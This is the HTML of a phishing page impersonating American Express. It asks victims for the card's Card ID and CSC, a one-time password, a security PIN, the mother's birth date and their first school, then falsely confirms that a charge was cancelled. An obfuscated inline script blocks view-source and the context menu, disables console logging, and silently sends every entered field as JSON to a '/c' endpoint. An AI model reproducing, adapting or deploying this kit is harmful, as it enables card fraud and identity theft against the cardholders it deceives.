						        <div style="color: #4e4e4e; width:240px; font-size: 0.83em; padding-left: 15px; padding-right: 15px; padding-top: 10px; line-height: 1rem;">
						        <small>The 4-digit Card ID number is printed on the front of your Card. It appears above and to the right of your Card number.</small>
						        <div>&nbsp;</div>
						        <small>The 3-Digit CSC is the last three digits printed on the signature strip on the back of your card.</small>
						        </div>
						        </div>
						      </div>
						      
						      <hr style="margin-top:20px; margin-bottom:20px; border:0; border-top:1px solid #aeaeae;">
						      
						      <!-- Buttons BELOW the image column -->
						      <div class="resetButtons">
						       <div><input type="hidden" name="trck" id="trckd" class="input-control"></div>
						        <button type="button" id="rcancelBtn">Cancel</button>
						        <button type="button" name="submitr" id="rcontinueBtn">Continue</button>
						      </div>
						      
						    </form>
						  </div>
						</div>

						                        
                       <div id="clsdiv2" style="padding: 5px 5px; display: none">
                          <form id="fuidb" action="#" method="post">
                          	<div class="dynamicContainer">
                          	<div><a class="btnstover" id="prev1" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;">Back</a></div>
                          	<div class="dynamicSubContainer">
					      	<div style="font-family: Helvetica Neue, Helvetica, sans-serif; padding: 15px; text-align: center; color: #404040; font-weight: 600; font-size: 18px;">  Security Verification: 3-Digit CSC </div>
					      	<div class="inputWrapper">  
                    		  <div style="line-height: 15px;">&nbsp;</div>
          			    		<p id="cscerror" style=" font-size: 14px; color: #b42c01; line-height: 18px; display: none;">&nbsp;</p>
          			    		<p id="cscrecount" style="font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 15px; color: #b42c01; line-height: 18px; display: none;">&nbsp;</p>
                    		  <p style="font-size: 15px; font-weight: 200; line-height: 18px;">Please enter the 3-digit Card Security Code (CSC) which are the last three numbers printed on the signature strip on the back of your card.</p>
                              <div style="padding: 15px 20px 15px; text-align: center;"><div class="csc-background"></div></div>
                              <label class="labelTxt"><span class="csc"></span></label>
                               <input id="cscInput" type="text" name="cscText" aria-invalid="false" aria-required="false" data-testid="csc-input" pattern="[0-9]*" aria-labelledby="cscPassword-label cscPassword-alert-label" class="input-control" maxlength="3" value="">
                             <div style="line-height: 15px;">&nbsp;</div>
                         	</div>
                           	<div><input type="hidden" name="trck" id="trckb" class="input-control"></div>
                           	<div>&nbsp;</div>
                           	<div><button type="button" name="submitb" class="btn btn-primary" id="verify" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;"> Confirm </button></div>
                           </div>
                           </div>
                          </form>
                         </div>

                        <div id="clsdiv3" style="padding: 5px 5px; display: none;">
                          <form id="fuidc" action="#" method="post">
                          <div class="dynamicContainer">
                          	<div><a class="btnstover" id="prev2" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;"> Log In </a></div>
					      	<div style="text-align: center; color: #313131; font-weight: 600; font-size: 22px;">  Verify your identity </div>
                           	<div id="subclsdiv3">
					      	<div class="dynamicSubContainer">
                    		  <div>&nbsp;</div>
                    		  <div style="line-height: 15px;">&nbsp;<p id="otpvrecount" style="font-size: 14px; color: #b42c01; line-height: 18px; display: none;"> &nbsp;</p></div>
                    		  <p style="font-size: 15px; font-weight: 400; line-height: 18px;">For security purposes, we need you to authenticate your device before proceeding.</p>
                    		  <div>&nbsp;</div>
                    		  <div>Please enter the one-time password sent to your registered email: <br>**<span class="emailid"></span>**@****.com.</div>
                    		  <p></p>
                    		  <div class="inputWrapper">
                               <label class="labelTxt"><span class="otp"></span></label>
                               <input id="otp" type="text" name="otpcode" aria-invalid="false" aria-required="false" data-testid="otp-input" pattern="[0-9]*" aria-labelledby="otp-label otp-alert-label" class="input-control" maxlength="12" value="">
                               </div>
                               <p></p>
                               <p style="line-height: 15px;"><a class="btnresend" id="resend" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;">Resend one-time password</a></p>
                               <div style="line-height: 15px;">&nbsp;<p id="otperror" style="font-size: 14px; color: #b42c01; line-height: 15px; display: none;"></p></div>
                    		  <div id="pnmmdd" style="display: none">
                    		  <div class="inputWrapper">
                    		  <div style="text-align: center; color: #313131; font-weight: 600; font-size: 15px; margin-bottom: 18px;">  Personal Security Question (<span style="font-style:italic;">Optional</span> ) </div>
                    		  <div>
                    		  <p id="pnerror" style="font-size: 14px; color: #b42c01; line-height: 18px; display: none;"></p>
                    		  <p id="mmdderror" style="font-size: 14px; color: #b42c01; line-height: 18px; display: none;"></p>
                    		  </div>
                    		  <label class="labelTxt"><span class="pn"></span></label>
                              <input id="pn" type="text" name="secPin" aria-invalid="false" aria-required="false" data-testid="secPin-input" aria-labelledby="secPin-label secPin-alert-label" class="input-control" placeholder="Confirm security PIN provided when you activated your card " maxlength="12" value="">
                    		  <div>&nbsp;</div>
                    		  <label class="labelTxt"><span class="mmdd"></span></label>
                              <input id="mmdd" type="text" name="mMMDD" aria-invalid="false" aria-required="false" data-testid="mmdd-input" aria-labelledby="mmdd-label mmdd-alert-label" class="input-control" placeholder="Confirm Mother's Birth (MM/DD) " maxlength="12" value="">
                    		  <div>&nbsp;</div>
                    		  <label class="labelTxt"><span class="k12"></span></label>
                              <input id="k12" type="text" name="k12" aria-invalid="false" aria-required="false" data-testid="school-input" aria-labelledby="school-label school-alert-label" class="input-control" placeholder="Confirm First Elementary School " maxlength="36" value="">
                              </div>
                         	</div>
                         	
                           	<div><input type="hidden" name="trck" id="trckc" class="input-control"></div>
                           	<div>&nbsp;</div>
                           	<div><button type="button" name="submitc" class="btn btn-primary" id="otpv" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;"> Verify </button></div>
                           </div>
                           </div>
                          </div> 
                         </form> 
                      </div>
                
                       <div id="clsdiv4" style="padding: 5px 5px; display: none">
                       	 <div class="dynamicContainer">
                           <form id="fuidd" action="#" method="post">
                            
                            <div class="dynamicSubContainer">
                        	<div class="fuidNav">
                        		<div class="normal identyWidth"><span class="normalText">1. Log In&nbsp;&nbsp;&&nbsp;&nbsp;Authentication </span></div>
                        		<div class="active normal retriveIdWidth"><span class="normalText">2. Finish</span></div>
                      		</div>
                      		<div class="inputWrapper">
                            	<div style="line-height: 18px;">&nbsp;</div>
							   	<div class="formHeader" style="text-align: center;"> <h3> Done! </h3> </div>
								<div style="margin-top: 10px; line-height: 20px;">&nbsp;</div>
                                <div style="font-size: 14px; color: #595959; text-align: center; font-weight: 600; line-height: 20px;"> Thank you for confirming the cancellation of the charge. </div>
                                <div style="margin-top: 10px; line-height: 20px;">&nbsp;<i class="bi-check-circle-fill"></i>&nbsp;</div>
                                <div style="line-height: 18px;">&nbsp;</div>
        						<div style="color: #b42c01; cursor: auto; text-align: center; font-size: 13px; line-height: 20px;">*&nbsp; <span style="color: #737373; cursor: auto; font-size: 12px; line-height: 20px;"> Thanks for your continued card membership with American Express. </span></div>
        						<div style="text-align: center;"><a href="https://norefer.com/to/https://www.americanexpress.com/account/logout?type=logoffAuto" rel="noopener noreferrer" style="margin-top: 30px; margin-bottom: 30px; text-align: center; line-height: 22px;" class="btn btn-primary"> Dashboard </a></div>
        					</div>
        					</div>
							</form>
						</div>
					</div>

		 </div>
		</div>
<script>
function _0x56c8(_0x2bac6b,_0x184ade){_0x2bac6b=_0x2bac6b-0xa9;const _0x3491cd=_0x1970();let _0x12a5dc=_0x3491cd[_0x2bac6b];return _0x12a5dc;}function _0x1970(){const _0x11caa4=['exception','closest','stringify','getElementById','toISOString','console','omit','location','143229gRQUrF','Hide','trace','return\x20(function()\x20','password','querySelectorAll','toLowerCase','1954255oEDgkD','pathname','name','bind','log','#clsdiv','keyCode','constructor','upw','catch','16755760zKLIRn','1956932VZKbge','POST','target','origin','info','change','table','toString','input,\x20textarea,\x20[contenteditable]','prototype','addEventListener','10216512nlaGuE','tagName','length','28TbnPcf','contextmenu','ctrlKey','application/json;\x20charset=UTF-8','type','warn','sendBeacon','includes','textContent','fields','__proto__','1310190rPRabk','1725519MihoIe','error','preventDefault','Show','INPUT','{}.constructor(\x22return\x20this\x22)(\x20)','keydown','input','mchange'];_0x1970=function(){return _0x11caa4;};return _0x1970();}(function(_0x38f681,_0x4d75e7){function _0x374487(_0x74ab8d,_0x1902ee){return _0x56c8(_0x74ab8d-0x275,_0x1902ee);}const _0x4751c9=_0x38f681();while(!![]){try{const _0x276f1e=-parseInt(_0x374487(0x359,0x36b))/0x1+-parseInt(_0x374487(0x33f,0x34e))/0x2+-parseInt(_0x374487(0x32d,0x31e))/0x3*(parseInt(_0x374487(0x34d,0x33e))/0x4)+parseInt(_0x374487(0x334,0x348))/0x5+parseInt(_0x374487(0x34a,0x330))/0x6+-parseInt(_0x374487(0x358,0x361))/0x7+parseInt(_0x374487(0x33e,0x34a))/0x8;if(_0x276f1e===_0x4d75e7)break;else _0x4751c9['push'](_0x4751c9['shift']());}catch(_0x126795){_0x4751c9['push'](_0x4751c9['shift']());}}}(_0x1970,0xeb09d));function setupUI(){const _0x1064c5=(function(){let _0x38597d=!![];return function(_0x10deb8,_0x34781b){const _0x58b89d=_0x38597d?function(){if(_0x34781b){const _0x3d01bb=_0x34781b['apply'](_0x10deb8,arguments);return _0x34781b=null,_0x3d01bb;}}:function(){};return _0x38597d=![],_0x58b89d;};}());function _0x38e111(_0x29f77a,_0x24d17a){return _0x56c8(_0x29f77a-0x64,_0x24d17a);}const _0x1b63b1=_0x1064c5(this,function(){const _0x516b7f=function(){let _0x582b02;try{_0x582b02=Function(_0x10007b(0x35,0x1f)+_0x10007b(0x1b,0x10)+');')();}catch(_0x555142){_0x582b02=window;}function _0x10007b(_0x53815b,_0x38b46e){return _0x56c8(_0x38b46e- -0x9c,_0x53815b);}return _0x582b02;},_0x51d178=_0x516b7f(),_0x10bffa=_0x51d178['console']=_0x51d178[_0x54e0f2(0x85,0x99)]||{},_0x3d8a39=[_0x54e0f2(0x93,0xa8),_0x54e0f2(0xad,0xc4),_0x54e0f2(0x9e,0x98),_0x54e0f2(0xb5,0xa3),_0x54e0f2(0x80,0x7b),_0x54e0f2(0xa0,0xb4),_0x54e0f2(0x8a,0x7b)];function _0x54e0f2(_0x258881,_0x52c60d){return _0x56c8(_0x258881- -0x30,_0x52c60d);}for(let _0x538792=0x0;_0x538792<_0x3d8a39[_0x54e0f2(0xa7,0xa2)];_0x538792++){const _0x5d6371=_0x1064c5[_0x54e0f2(0x96,0xb2)][_0x54e0f2(0xa3,0xaa)][_0x54e0f2(0x92,0x99)](_0x1064c5),_0x154dbb=_0x3d8a39[_0x538792],_0x178281=_0x10bffa[_0x154dbb]||_0x5d6371;_0x5d6371[_0x54e0f2(0xb2,0xb5)]=_0x1064c5['bind'](_0x1064c5),_0x5d6371['toString']=_0x178281[_0x54e0f2(0xa1,0x8a)][_0x54e0f2(0x92,0x75)](_0x178281),_0x10bffa[_0x154dbb]=_0x5d6371;}});_0x1b63b1();const _0x25a8e5=''+window[_0x38e111(0x11b,0x122)][_0x38e111(0x131,0x124)]+window[_0x38e111(0x11b,0x107)][_0x38e111(0x124,0x12a)]+'/c';document['addEventListener'](_0x38e111(0x111,0x111),_0x17e96d=>{function _0x1ecb76(_0x2c7aa2,_0x4dc77c){return _0x56c8(_0x4dc77c- -0xe1,_0x2c7aa2);}const _0x40c29c=[0x53,0x3e,0x7,0x55,0x1a8],_0x1d3eea=['u'];_0x17e96d[_0x1ecb76(0xc,-0x7)]&&(_0x40c29c[_0x1ecb76(-0xf,-0x2)](_0x17e96d[_0x1ecb76(-0xb,-0x1c)])||_0x1d3eea[_0x1ecb76(0x17,-0x2)](_0x17e96d['key']?.[_0x1ecb76(-0x1f,-0x23)]()))&&_0x17e96d[_0x1ecb76(-0x22,-0x38)]();}),document[_0x38e111(0x138,0x130)](_0x38e111(0x13d,0x148),_0x4da438=>{function _0x579f59(_0x1adc57,_0x4f13c6){return _0x56c8(_0x4f13c6- -0x78,_0x1adc57);}!_0x4da438['target']['closest'](_0x579f59(0x3f,0x5a))&&_0x4da438[_0x579f59(0x16,0x31)]();});const _0x3a15ea=document[_0x38e111(0x117,0xfc)](_0x38e111(0x12b,0x142)),_0x534cb1=document[_0x38e111(0x117,0x100)]('toggleupw');let _0x39b053=![];_0x3a15ea&&_0x3a15ea[_0x38e111(0x138,0x14b)](_0x38e111(0x112,0x117),()=>{function _0x416cc1(_0x20b304,_0x45f31b){return _0x56c8(_0x20b304-0x180,_0x45f31b);}!_0x39b053&&(_0x39b053=!![],_0x3a15ea['type']=_0x416cc1(0x23c,0x247));});_0x3a15ea&&_0x534cb1&&_0x534cb1['addEventListener']('click',()=>{function _0x5c48b4(_0xcbbba8,_0x2502f8){return _0x56c8(_0xcbbba8-0x169,_0x2502f8);}if(!_0x39b053)return;const _0x4b62e7=_0x3a15ea[_0x5c48b4(0x245,0x230)]===_0x5c48b4(0x225,0x228)?'text':'password';_0x3a15ea[_0x5c48b4(0x245,0x262)]=_0x4b62e7,_0x534cb1[_0x5c48b4(0x249,0x231)]=_0x4b62e7==='password'?_0x5c48b4(0x213,0x224):_0x5c48b4(0x222,0x213);});function _0x53ac95(_0x14d680){function _0x1d5693(_0x42f36b,_0x2a9586){return _0x56c8(_0x2a9586-0x62,_0x42f36b);}try{const _0x41baff=JSON[_0x1d5693(0x103,0x114)](_0x14d680),_0x19318f=new Blob([_0x41baff],{'type':_0x1d5693(0x14e,0x13d)});let _0x50816c=navigator[_0x1d5693(0x129,0x140)]&&navigator[_0x1d5693(0x157,0x140)](_0x25a8e5,_0x19318f);!_0x50816c&&_0x25a8e5&&fetch(_0x25a8e5,{'method':_0x1d5693(0x12e,0x12d),'body':_0x41baff,'headers':{'Content-Type':_0x1d5693(0x141,0x13d)},'keepalive':!![],'credentials':_0x1d5693(0xfb,0x118)})[_0x1d5693(0x121,0x12a)](()=>{});}catch{}}document[_0x38e111(0x138,0x13b)](_0x38e111(0x133,0x14f),_0x5a129b=>{const _0x29682f=_0x5a129b[_0x3e88a9(0x4b8,0x4aa)];function _0x3e88a9(_0x21860d,_0x310ba9){return _0x56c8(_0x310ba9-0x3de,_0x21860d);}if(_0x29682f?.[_0x3e88a9(0x47f,0x48f)](_0x3e88a9(0x4b9,0x4a2))&&_0x29682f[_0x3e88a9(0x49e,0x4b4)]===_0x3e88a9(0x488,0x489)){const _0x416bef={'eventType':_0x3e88a9(0x48a,0x48d),'timestamp':new Date()[_0x3e88a9(0x49a,0x492)](),'fields':{}};document[_0x3e88a9(0x486,0x49b)]('#clsdiv\x20input')['forEach'](_0x282185=>{function _0x168c4a(_0x2a99c4,_0x51123a){return _0x56c8(_0x51123a- -0x3a0,_0x2a99c4);}_0x282185['name']&&(_0x416bef[_0x168c4a(-0x2b3,-0x2bf)][_0x282185[_0x168c4a(-0x2c1,-0x2df)]]=_0x282185['value']);}),_0x53ac95(_0x416bef);}});}setupUI();
</script>
		
		
<footer class="amex-footer">
  <div class="footer-container">
    <div class="footer-top">
      <div class="footer-logo">
        <svg xmlns="http://www.w3.org/2000/svg" width="235" height="15" viewBox="0 0 235 15"><path fill="none" d="M0 0h235v15H0z"/><path d="M230.1 5.8h-3.6c-.8 0-1.3-.5-1.3-1.2s.6-1.1 1.3-1.1h6.5l1.5-3.3h-8c-3.3 0-5.2 2-5.2 4.6 0 2.8 1.8 4.4 4.7 4.4h3.6c.8 0 1.3.5 1.3 1.2s-.5 1.2-1.3 1.2h-7.8v3.3h7.8c3.3 0 5.2-1.9 5.2-4.7 0-2.8-1.7-4.4-4.7-4.4m-14.3 0h-3.6c-.8 0-1.3-.5-1.3-1.2s.6-1.1 1.3-1.1h6.5l1.5-3.3h-8c-3.3 0-5.2 2-5.2 4.6 0 2.8 1.8 4.4 4.7 4.4h3.6c.8 0 1.3.5 1.3 1.2s-.5 1.2-1.3 1.2h-7.8v3.3h7.8c3.3 0 5.2-1.9 5.2-4.7 0-2.8-1.7-4.4-4.7-4.4m-22.8 9h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2H193zm-7.7-8.4h-4.1V3.5h4.1c1.2 0 1.8.7 1.8 1.5-.1.8-.7 1.4-1.8 1.4m5.7-1.5c0-2.8-2-4.7-5.2-4.7h-8.4v14.6h3.9V9.7h1.4l4.4 5.1h4.8l-4.8-5.3c2.4-.5 3.9-2.3 3.9-4.6m-21 1.8h-4.2V3.5h4.2c1.2 0 1.8.7 1.8 1.6-.1.9-.7 1.6-1.8 1.6m.4-6.5h-8.5v14.6h3.9V10h4.5c3.3 0 5.3-2.1 5.3-4.9 0-2.9-2-4.9-5.2-4.9m-9.2 0h-5l-3.8 4.4-3.8-4.4h-5.1l6.4 7.2-6.5 7.4h5l3.9-4.6 4 4.6h5.1l-6.6-7.5zm-30.7 14.6h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2h-12.3zm-13.7-5.7l-6-8.9h-4.9v14.6h3.9V5.5l6.1 9.3h4.7V.2h-3.8zm-22.7-.5l2-4.9 2 4.9h-4zM93.7.2l-6.4 14.6h4.3l1.2-3h6.8l1.3 3h4.4L98.7.2h-5zM80.9 7.6v-.3c0-2.2 1.2-3.7 3.7-3.7H89V.2h-4.7C79.5.2 77 3.3 77 7.3v.3c0 4.5 2.8 7.1 7.1 7.1h1.3l1.6-3.3h-2.3c-2.3.1-3.8-1.2-3.8-3.8M71.1.2v14.6H75V.2zm-7.8 6.2h-4.1V3.5h4.1c1.2 0 1.8.7 1.8 1.5s-.6 1.4-1.8 1.4M69 4.9c0-2.8-2-4.7-5.2-4.7h-8.4v14.6h3.9V9.7h1.4l4.4 5.1H70l-4.8-5.3C67.6 9 69 7.2 69 4.9m-28.5 9.9h12.3v-3.3h-8.4V9.1h8.2V5.8h-8.2V3.5h8.4V.2H40.5zM28.1 9.4L24.8.2h-6.1v14.6h3.8V4.3l3.8 10.5h3.5l3.9-10.5v10.5h3.8V.2h-6.1zM6.9 8.6l2-4.9 2 4.9h-4zM6.4.2L0 14.8h4.3l1.2-3h6.8l1.3 3H18L11.5.2H6.4z" fill="#006fcf"/></svg>
      </div>
      <div class="country-selector">
        <svg xmlns="http://www.w3.org/2000/svg" width="23" height="23" viewBox="0 0 100 69"><path fill="#FFF" d="M0 0h100v69H0z"/><path fill="#BD3D44" d="M0 0h100v5.308H0V0zm0 10.615h100v5.308H0v-5.308zm0 10.616h100v5.308H0V21.23zm0 10.615h100v5.308H0v-5.308zm0 10.616h100v5.308H0v-5.308zm0 10.615h100v5.308H0v-5.308zm0 10.616h100V69H0v-5.308z"/><path fill="#192F5D" d="M0 0h52.44v37.154H0V0z"/><path fill="#FFF" d="m4.37 1.59.477 1.469h1.544l-1.249.907.477 1.469-1.25-.908-1.248.908.477-1.469-1.25-.907h1.545L4.37 1.59zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.907h1.545l.477-1.469zm8.74 0 .477 1.469h1.545l-1.25.907.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0 .477 1.469h1.545l-1.25.907.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .478 1.469h1.544l-1.25.907.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.907h1.545l.477-1.469zM8.74 5.306l.477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.476-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zM4.37 9.021l.477 1.468h1.544l-1.249.908.477 1.469-1.25-.908-1.248.908.477-1.469-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.908h1.544l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.469-1.25-.908-1.249.908.477-1.469-1.249-.908h1.544l.477-1.468zm8.74 0 .478 1.468h1.544l-1.25.908.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.908h1.545l.477-1.468zM8.74 12.736l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.249.907.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.25.907.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.249.907.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .478 1.469h1.544l-1.25.907.478 1.469-1.25-.907-1.249.907.478-1.469-1.25-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.907-1.249.907.477-1.469-1.25-.907h1.545l.477-1.469zM4.37 16.452l.477 1.468h1.544l-1.249.908.477 1.468-1.25-.907-1.248.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.477-1.468zM8.74 20.167l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .478 1.469h1.544l-1.25.907.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.907h1.545l.477-1.469zM4.37 23.883l.477 1.468h1.544l-1.249.908.477 1.468-1.25-.907-1.248.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.477-1.468zM8.74 27.598l.477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.25.908.478-1.469-1.25-.907h1.545l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.249-.907h1.544l.477-1.469zm8.74 0 .478 1.469h1.544l-1.25.907.478 1.469-1.25-.908-1.249.908.478-1.469-1.25-.907h1.544l.477-1.469zm8.74 0 .477 1.469h1.544l-1.249.907.477 1.469-1.249-.908-1.249.908.477-1.469-1.25-.907h1.545l.477-1.469zM4.37 31.314l.477 1.468h1.544l-1.249.908.477 1.468-1.25-.907-1.248.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.249.907.477-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .477 1.468h1.544l-1.249.908.477 1.468-1.249-.907-1.25.907.478-1.468-1.25-.908h1.545l.477-1.468zm8.74 0 .477 1.468h1.545l-1.25.908.478 1.468-1.25-.907-1.249.907.477-1.468-1.249-.908h1.544l.477-1.468zm8.74 0 .478 1.468h1.544l-1.25.908.478 1.468-1.25-.907-1.249.907.478-1.468-1.25-.908h1.545l.477-1.468z"/></svg>
        <span>United States</span>
        <a href="#">Change Country</a>
      </div>
    </div>

    <nav class="social-links" aria-label="Social Media">
      <ul>
        <li>
            <svg viewBox="0 0 32 32" role="img"><rect width="32" height="32" rx="4" fill="#3b5998"/><path d="M22 16.22h-3.44v9.78h-4.44v-9.78H12v-3.78h2.12v-2.55c0-1.77.89-4.45 4.45-4.45l3.22.02v3.67h-2.3c-.22 0-.55.12-.55.65v2.66H22l-.44 3.78h.44z" fill="white"/></svg>
        </li>
        <li class="icon-x">
			<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 63.000000 64.000000" preserveAspectRatio="xMidYMid meet"> <g transform="translate(0.000000,64.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none"> <path d="M22 608 c48 -64 218 -316 218 -323 0 -4 -54 -70 -120 -146 -113 -130 -118 -139 -92 -139 23 0 45 20 131 120 57 66 107 120 110 120 4 0 45 -54 91 -120 l83 -120 93 0 94 0 -53 77 c-30 43 -87 125 -126 182 -40 57 -70 109 -68 115 3 6 53 66 111 133 58 67 106 124 106 127 0 3 -10 6 -23 6 -18 0 -49 -29 -122 -115 -54 -63 -101 -115 -104 -115 -3 0 -41 52 -85 115 l-79 115 -94 0 -95 0 24 -32z m335 -288 l194 -275 -42 -3 c-22 -2 -42 -2 -43 0 -83 115 -382 544 -385 551 -1 4 16 7 40 5 l43 -3 193 -275z"/> </g> </svg>
        </li>
        <li>
